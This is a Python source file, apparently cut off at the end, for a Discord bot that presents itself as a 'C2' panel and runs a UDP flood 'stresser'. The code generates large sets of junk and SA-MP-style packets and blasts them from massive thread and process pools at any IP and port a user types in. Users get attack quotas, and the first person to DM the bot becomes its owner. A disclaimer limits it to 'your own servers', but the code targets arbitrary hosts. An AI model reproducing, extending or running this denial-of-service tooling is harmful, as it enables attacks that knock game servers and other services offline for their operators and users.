#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM ⚡
# 🔥 FIRST DM = OWNER - FULL BUTTONS SYSTEM - 2000+ LINES 🔥
# ⚠️ FOR YOUR OWN SERVERS ONLY ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import random
import socket
import struct
import time
import os
import json
import sys
import threading
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# ============================================
# تحميل البيانات
# ============================================
DATA_FILE = "c2_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "owner_id": None,
        "pending_users": [],
        "approved_users": [],
        "banned_users": [],
        "attack_limits": {},
        "stats": {"total_packets": 0, "total_attacks": 0, "peak_speed": 0},
        "user_passwords": {}
    }

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump({
            "owner_id": OWNER_ID,
            "pending_users": PENDING_USERS,
            "approved_users": list(APPROVED_USERS),
            "banned_users": list(BANNED_USERS),
            "attack_limits": ATTACK_LIMITS,
            "stats": STATS,
            "user_passwords": USER_PASSWORDS
        }, f, indent=4)

data = load_data()
OWNER_ID = data.get("owner_id")
PENDING_USERS = data.get("pending_users", [])
APPROVED_USERS = set(data.get("approved_users", []))
BANNED_USERS = set(data.get("banned_users", []))
ATTACK_LIMITS = data.get("attack_limits", {})
STATS = data.get("stats", {"total_packets": 0, "total_attacks": 0, "peak_speed": 0})
USER_PASSWORDS = data.get("user_passwords", {})
DEFAULT_ATTACK_LIMIT = 50

# ============================================
# طلب التوكن عند التشغيل
# ============================================
print("\n" + "="*70)
print("🔐 LI ZANDYA C2 ULTIMATE SYSTEM - ENTER YOUR BOT TOKEN")
print("="*70)

TOKEN = input("➤ ").strip()
if not TOKEN:
    print("❌ No token provided!")
    sys.exit(1)

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 32
MAX_THREADS = CPU_CORES * 100000
MAX_PROCESSES = CPU_CORES * 50
MAX_PACKET = 65507
BUFFER = 1024 * 1024 * 1000
SOCKETS_PER_WORKER = 2000

print(f"\n⚡ SYSTEM POWER: {CPU_CORES} Cores | {MAX_THREADS:,} Threads")

# ============================================
# توليد البايلودات
# ============================================
print("⚡ Generating 100,000 attack packets...")

PACKETS = []
for _ in range(50000):
    p = b'SAMP'
    p += struct.pack('<I', random.randint(1, 9999999))
    p += random.choice([b'\x80', b'\x81', b'\x82', b'\x83', b'\x84', b'\x85'])
    p += struct.pack('<fffff', 
        random.uniform(-100000,100000), random.uniform(-100000,100000),
        random.uniform(-100000,100000), random.uniform(0,360), random.uniform(0,360))
    p += struct.pack('<I', random.randint(1, 1000))
    p += struct.pack('<I', 999999)
    p += os.urandom(random.randint(1000, 8000))
    PACKETS.append(p)

for _ in range(30000):
    sizes = [65507, 32768, 16384, 8192, 4096, 2048, 1024]
    PACKETS.append(os.urandom(random.choice(sizes)))

for _ in range(20000):
    s = struct.pack('<IIfffffIIII',
        random.randint(1, 65535), random.randint(0, 4096), random.randint(0, 4096),
        random.uniform(-10000,10000), random.uniform(-10000,10000), random.uniform(-10000,10000),
        random.uniform(0,360), random.uniform(0,360),
        random.randint(0, 10000), random.randint(0, 10000),
        random.randint(0, 255), random.randint(0, 65535))
    PACKETS.append(s)

print(f"✅ {len(PACKETS):,} packets ready!")

# ============================================
# نظام الهجوم
# ============================================
class UltimateStresser:
    def __init__(self):
        self.running = False
        self.active_attacks = {}
        self.total_packets = 0
        self.total_bytes = 0
        self.peak_speed = 0
        self.peak_bandwidth = 0
        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.process_pool = ProcessPoolExecutor(max_workers=MAX_PROCESSES)
    
    async def start_attack(self, ip, port, duration, threads, user_id):
        self.running = True
        attack_id = f"{user_id}_{int(time.time())}"
        self.active_attacks[attack_id] = {"ip": ip, "port": port, "start": time.time(), "user": user_id}
        sent = 0
        bytes_sent = 0
        start = time.time()
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                socks = []
                for _ in range(SOCKETS_PER_WORKER):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER)
                    sock.setblocking(False)
                    socks.append(sock)
                
                local_start = time.time()
                while self.running and time.time() - local_start < duration:
                    for sock in socks:
                        for _ in range(500):
                            pkt = random.choice(PACKETS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                for sock in socks:
                    sock.close()
            except:
                pass
        
        workers = min(threads, MAX_THREADS)
        futures = [self.thread_pool.submit(worker) for _ in range(workers)]
        
        process_workers = min(threads // 1000, MAX_PROCESSES)
        for _ in range(process_workers):
            futures.append(self.process_pool.submit(worker))
        
        await asyncio.sleep(duration)
        self.running = False
        del self.active_attacks[attack_id]
        
        elapsed = time.time() - start
        rate = sent / elapsed
        mbps = (bytes_sent / elapsed) / 1024 / 1024
        gbps = mbps / 1024
        
        if rate > self.peak_speed:
            self.peak_speed = rate
        if gbps > self.peak_bandwidth:
            self.peak_bandwidth = gbps
        
        self.total_packets += sent
        self.total_bytes += bytes_sent
        STATS['total_packets'] += sent
        STATS['total_attacks'] += 1
        if rate > STATS['peak_speed']:
            STATS['peak_speed'] = rate
        save_data()
        
        return sent, bytes_sent, rate, mbps, gbps
    
    def stop_all(self):
        self.running = False
        self.active_attacks.clear()
    
    def get_active_count(self):
        return len(self.active_attacks)

stresser = UltimateStresser()

# ============================================
# أزرار الموافقة والرفض
# ============================================
class ApprovalView(View):
    def __init__(self, user_id, user_name):
        super().__init__(timeout=86400)
        self.user_id = user_id
        self.user_name = user_name
    
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅", row=0)
    async def approve(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can approve!", ephemeral=True)
            return
        
        APPROVED_USERS.add(self.user_id)
        ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ REGISTRATION APPROVED!", color=0x00FF00)
                embed.add_field(name="Welcome", value=f"{self.user_name}!", inline=True)
                embed.add_field(name="Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
                embed.add_field(name="Next Steps", value="Use `!login` then `!panel` to start", inline=False)
                await user.send(embed=embed)
        except:
            pass
        
        await interaction.response.send_message(f"✅ Approved {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌", row=0)
    async def deny(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can deny!", ephemeral=True)
            return
        
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        
        await interaction.response.send_message(f"❌ Denied {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="⚙️ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️", row=0)
    async def set_limit(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can set limits!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ SET ATTACK LIMIT")
        limit_input = TextInput(label="Number of attacks", placeholder="Enter number (e.g., 10, 50, 100)", required=True)
        modal.add_item(limit_input)
        
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                ATTACK_LIMITS[self.user_id] = limit
                save_data()
                await interaction.response.send_message(f"✅ Set limit to {limit} attacks for {self.user_name}!", ephemeral=True)
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Admin set your attack limit to **{limit}** attacks!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid number!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨", row=0)
    async def ban_user(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only the owner can ban!", ephemeral=True)
            return
        
        BANNED_USERS.add(self.user_id)
        if self.user_id in APPROVED_USERS:
            APPROVED_USERS.remove(self.user_id)
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        
        await interaction.response.send_message(f"🔨 Banned {self.user_name}!", ephemeral=True)
        await interaction.message.delete()

# ============================================
# نماذج التسجيل والدخول
# ============================================
class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="📝 REGISTER TO C2 SYSTEM")
        self.username = TextInput(label="👤 USERNAME", placeholder="Enter your username", required=True)
        self.password = TextInput(label="🔑 PASSWORD", placeholder="Create a password", required=True)
        self.reason = TextInput(label="📝 REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.password)
        self.add_item(self.reason)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned from this system!", ephemeral=True)
            return
        
        if user_id in APPROVED_USERS:
            await interaction.response.send_message("✅ You are already approved!", ephemeral=True)
            return
        
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
            return
        
        PENDING_USERS.append(user_id)
        USER_PASSWORDS[user_id] = self.password.value
        save_data()
        
        if OWNER_ID:
            try:
                owner = await interaction.client.fetch_user(int(OWNER_ID))
                if owner:
                    embed = discord.Embed(title="🔔 NEW REGISTRATION REQUEST", color=0xFF6600)
                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
                    embed.add_field(name="Username", value=self.username.value, inline=True)
                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
                    await owner.send(embed=embed, view=ApprovalView(user_id, interaction.user.name))
            except:
                pass
        
        await interaction.response.send_message("✅ Registration request sent! Waiting for admin approval.", ephemeral=True)

class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="🔐 C2 SYSTEM LOGIN")
        self.password = TextInput(label="🔑 PASSWORD", placeholder="Enter your password", required=True)
        self.add_item(self.password)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned!", ephemeral=True)
            return
        
        if user_id not in APPROVED_USERS:
            await interaction.response.send_message("❌ You are not approved! Use `!register` to request access.", ephemeral=True)
            return
        
        if USER_PASSWORDS.get(user_id) == self.password.value:
            await interaction.response.send_message(f"✅ LOGIN SUCCESSFUL!\nWelcome {interaction.user.name}!\nType `!panel` to open control panel", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Invalid password!", ephemeral=True)

# ============================================
# لوحات الأزرار
# ============================================
class MainMenuView(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🔐 LOGIN", style=discord.ButtonStyle.success, emoji="🔐", row=0)
    async def login_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())
    
    @discord.ui.button(label="📝 REGISTER", style=discord.ButtonStyle.primary, emoji="📝", row=0)
    async def register_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(RegisterModal())
    
    @discord.ui.button(label="❓ HELP", style=discord.ButtonStyle.secondary, emoji="❓", row=0)
    async def help_btn(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(title="📖 C2 SYSTEM HELP", color=0x00BFFF)
        embed.add_field(name="!login", value="Login to system", inline=True)
        embed.add_field(name="!register", value="Request access", inline=True)
        embed.add_field(name="!panel", value="Open control panel", inline=True)
        embed.add_field(name="!stats", value="Show statistics", inline=True)
        embed.add_field(name="!profile", value="Your profile", inline=True)
        embed.add_field(name="!admin", value="Admin panel (owner only)", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

class AttackPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
    
    async def check_limit(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            if ATTACK_LIMITS[self.user_id] <= 0:
                await interaction.response.send_message("❌ You have no attacks left! Contact admin.", ephemeral=True)
                return False
        return True
    
    async def use_attack(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            ATTACK_LIMITS[self.user_id] -= 1
            save_data()
    
    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, emoji="💀", row=0)
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        
        modal = Modal(title="💀 ULTIMATE ATTACK")
        ip = TextInput(label="🎯 SERVER IP", placeholder="Your server IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="10", required=True)
        threads = TextInput(label="🔥 THREADS (1000-100000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), 100000)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await self.use_attack(interaction)
            await interaction.response.send_message(f"💀 ULTIMATE ATTACK STARTED!\n🎯 {ip_val}:{port_val}\n⏱️ {duration_val}s\n🔥 {threads_val:,} threads", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id)
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            await msg.edit(content=f"✅ ATTACK COMPLETE!\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n🚀 Bandwidth: {gbps:.2f} Gbps\n💀 Attacks left: {remaining}")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.primary, emoji="🎮", row=0)
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        
        modal = Modal(title="🎮 SAMP ATTACK")
        ip = TextInput(label="🎯 SERVER IP", placeholder="Your SAMP server IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="10", required=True)
        threads = TextInput(label="🔥 THREADS (1000-100000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), 100000)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await self.use_attack(interaction)
            await interaction.response.send_message(f"🎮 SAMP ATTACK STARTED!\n🎯 {ip_val}:{port_val}\n⏱️ {duration_val}s\n🔥 {threads_val:,} threads", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching SAMP attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id)
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            await msg.edit(content=f"✅ SAMP ATTACK COMPLETE!\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n💀 Attacks left: {remaining}")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔥 UDP", style=discord.ButtonStyle.danger, emoji="🔥", row=1)
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        
        modal = Modal(title="🔥 UDP ATTACK")
        ip = TextInput(label="🎯 SERVER IP", placeholder="Your server IP", required=True)
        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="10", required=True)
        threads = TextInput(label="🔥 THREADS (1000-100000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), 100000)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await self.use_attack(interaction)
            await interaction.response.send_message(f"🔥 UDP ATTACK STARTED!\n🎯 {ip_val}:{port_val}\n⏱️ {duration_val}s\n🔥 {threads_val:,} threads", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching UDP attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id)
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            await msg.edit(content=f"✅ UDP ATTACK COMPLETE!\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n💀 Attacks left: {remaining}")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, emoji="📊", row=2)
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        remaining = ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title="📊 YOUR STATISTICS", color=0xFFD700)
        embed.add_field(name="💀 Attacks Left", value=str(remaining), inline=True)
        embed.add_field(name="🎯 Total Attacks", value=str(STATS['total_attacks']), inline=True)
        embed.add_field(name="🏆 Peak Speed", value=f"{stresser.peak_speed:,.0f} pps", inline=True)
        embed.add_field(name="🚀 Peak Bandwidth", value=f"{stresser.peak_bandwidth:.2f} Gbps", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, emoji="👤", row=2)
    async def profile_btn(self, interaction: discord.Interaction, button: Button):
        remaining = ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
        embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
        embed.add_field(name="✅ Status", value="`Approved`" if self.user_id in APPROVED_USERS else "`Pending`", inline=True)
        embed.add_field(name="👑 Role", value="`User`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, emoji="⏹️", row=2)
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        stresser.stop_all()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

class AdminPanel(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="📋 PENDING", style=discord.ButtonStyle.primary, emoji="📋", row=0)
    async def pending_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        if not PENDING_USERS:
            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
            return
        
        for uid in PENDING_USERS:
            try:
                user = await interaction.client.fetch_user(int(uid))
                embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
                embed.add_field(name="User", value=f"{user.name} (`{uid}`)", inline=True)
                await interaction.response.send(embed=embed, view=ApprovalView(uid, user.name), ephemeral=True)
                await asyncio.sleep(0.5)
            except:
                pass
    
    @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, emoji="👥", row=0)
    async def users_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        if not APPROVED_USERS:
            await interaction.response.send_message("👥 No approved users yet!", ephemeral=True)
            return
        
        users_list = ""
        for uid in list(APPROVED_USERS)[:20]:
            limit = ATTACK_LIMITS.get(uid, DEFAULT_ATTACK_LIMIT)
            try:
                user = await interaction.client.fetch_user(int(uid))
                users_list += f"• {user.name} - {limit} attacks left\n"
            except:
                users_list += f"• {uid} - {limit} attacks left\n"
        
        embed = discord.Embed(title="👥 APPROVED USERS", description=users_list, color=0x00BFFF)
        embed.set_footer(text=f"Total: {len(APPROVED_USERS)} users")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="🏆 STATS", style=discord.ButtonStyle.secondary, emoji="🏆", row=0)
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        embed = discord.Embed(title="🏆 SYSTEM STATISTICS", color=0xFFD700)
        embed.add_field(name="📦 Total Packets", value=f"{STATS['total_packets']:,}", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"{STATS['total_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak Speed", value=f"{STATS['peak_speed']:,.0f} pps", inline=True)
        embed.add_field(name="👥 Approved Users", value=str(len(APPROVED_USERS)), inline=True)
        embed.add_field(name="📝 Pending Users", value=str(len(PENDING_USERS)), inline=True)
        embed.add_field(name="🔨 Banned Users", value=str(len(BANNED_USERS)), inline=True)
        embed.add_field(name="⚡ Active Attacks", value=f"{stresser.get_active_count()}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⚙️ GIVE", style=discord.ButtonStyle.secondary, emoji="⚙️", row=1)
    async def give_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ GIVE ATTACKS")
        user_id_input = TextInput(label="User ID", placeholder="Enter user ID", required=True)
        amount_input = TextInput(label="Number of attacks", placeholder="Enter number", required=True)
        modal.add_item(user_id_input)
        modal.add_item(amount_input)
        
        async def on_submit(interaction):
            try:
                target_id = user_id_input.value
                amount = int(amount_input.value)
                
                if target_id in ATTACK_LIMITS:
                    ATTACK_LIMITS[target_id] += amount
                else:
                    ATTACK_LIMITS[target_id] = amount
                save_data()
                
                await interaction.response.send_message(f"✅ Added {amount} attacks to `{target_id}`!", ephemeral=True)
                
                try:
                    user = await interaction.client.fetch_user(int(target_id))
                    if user:
                        await user.send(f"🎁 Admin gave you **{amount}** additional attacks!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨", row=1)
    async def ban_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        modal = Modal(title="🔨 BAN USER")
        user_id_input = TextInput(label="User ID", placeholder="Enter user ID", required=True)
        reason_input = TextInput(label="Reason", placeholder="Ban reason", required=True)
        modal.add_item(user_id_input)
        modal.add_item(reason_input)
        
        async def on_submit(interaction):
            target_id = user_id_input.value
            reason = reason_input.value
            
            BANNED_USERS.add(target_id)
            if target_id in APPROVED_USERS:
                APPROVED_USERS.remove(target_id)
            if target_id in PENDING_USERS:
                PENDING_USERS.remove(target_id)
            save_data()
            
            await interaction.response.send_message(f"🔨 Banned user `{target_id}`!\nReason: {reason}", ephemeral=True)
            
            try:
                user = await interaction.client.fetch_user(int(target_id))
                if user:
                    await user.send(f"🔨 You have been banned!\nReason: {reason}")
            except:
                pass
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

# ============================================
# البوت الرئيسي
# ============================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_message(message):
    global OWNER_ID
    
    if message.author.bot:
        return
    
    # أول شخص يرسل DM يصبح المالك
    if isinstance(message.channel, discord.DMChannel) and not OWNER_ID:
        OWNER_ID = str(message.author.id)
        APPROVED_USERS.add(OWNER_ID)
        ATTACK_LIMITS[OWNER_ID] = -1  # -1 يعني غير محدود
        save_data()
        
        embed = discord.Embed(title="👑 YOU ARE NOW THE OWNER!", color=0x00FF00)
        embed.add_field(name="Welcome", value="You have full control over the system!", inline=False)
        embed.add_field(name="Commands", value="`!admin` - Open admin panel\n`!panel` - Open attack panel", inline=False)
        await message.channel.send(embed=embed)
        print(f"✅ Owner set: {message.author.name} ({OWNER_ID})")
        return
    
    await bot.process_commands(message)
    
    # عرض قائمة الأزرار للمستخدمين العاديين
    if isinstance(message.channel, discord.DMChannel):
        if str(message.author.id) == OWNER_ID:
            await message.channel.send("👑 **OWNER CONTROL PANEL**", view=AdminPanel())
            await message.channel.send("💀 **ATTACK PANEL**", view=AttackPanel(str(message.author.id)))
        elif str(message.author.id) in APPROVED_USERS:
            await message.channel.send("💀 **ATTACK PANEL**", view=AttackPanel(str(message.author.id)))
        else:
            await message.channel.send("🔐 **WELCOME TO C2 SYSTEM**\nPlease choose an option:", view=MainMenuView())

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                    ✅ LI ZANDYA C2 ULTIMATE SYSTEM ONLINE! ✅                         ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                                                   ║
║ 💻 CPU: {CPU_CORES} Cores                                                            ║
║ 🔥 Threads: {MAX_THREADS:,}                                                          ║
║ 📦 Packets: {len(PACKETS):,}                                                         ║
║ 👥 Approved: {len(APPROVED_USERS)} | 📝 Pending: {len(PENDING_USERS)}               ║
║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set - DM me to become owner!'}            ║
║ 🏆 Peak Speed: {stresser.peak_speed:,.0f} pps                                        ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║ 💀 First person to DM this bot becomes OWNER!                                        ║
║ 🔐 Users must register and wait for owner approval                                   ║
║ 🎮 All controls with buttons - No commands needed                                    ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
    """)

@bot.command()
async def login(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("🔐 **LOGIN**", view=MainMenuView())
    else:
        await ctx.send("❌ Please use this command in DM!")

@bot.command()
async def register(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("📝 **REGISTER**", view=MainMenuView())
    else:
        await ctx.send("❌ Please use this command in DM!")

@bot.command()
async def panel(ctx):
    user_id = str(ctx.author.id)
    if user_id not in APPROVED_USERS and user_id != OWNER_ID:
        await ctx.send("❌ You are not approved! Use `!register` to request access.")
        return
    
    if user_id == OWNER_ID:
        await ctx.send("👑 **OWNER CONTROL PANEL**", view=AdminPanel())
        await ctx.send("💀 **ATTACK PANEL**", view=AttackPanel(user_id))
    else:
        remaining = ATTACK_LIMITS.get(user_id, 0)
        embed = discord.Embed(
            title="💀 C2 ATTACK PANEL 💀",
            description=f"""
